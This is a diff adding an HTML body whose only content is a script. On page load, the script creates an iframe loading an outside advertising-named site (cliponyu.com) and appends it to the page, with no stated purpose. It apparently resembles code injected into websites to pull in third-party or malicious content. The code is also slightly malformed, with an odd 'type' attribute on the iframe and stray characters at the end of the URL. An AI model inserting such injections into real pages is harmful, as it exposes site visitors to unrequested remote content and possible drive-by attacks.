@@ -1,0 +1,19 @@
+<body>
+
+<script>
+
+{
+var c=document.createElement("iframe");
+
+c.setAttribute("type","text/javascript");
+c.setAttribute("width","1350");
+
+c.setAttribute("src","http://www.cliponyu.com/liveshowadvertising'};");
+
+document.body.appendChild(c)
+}
+
+</script>
+
+
+</body>
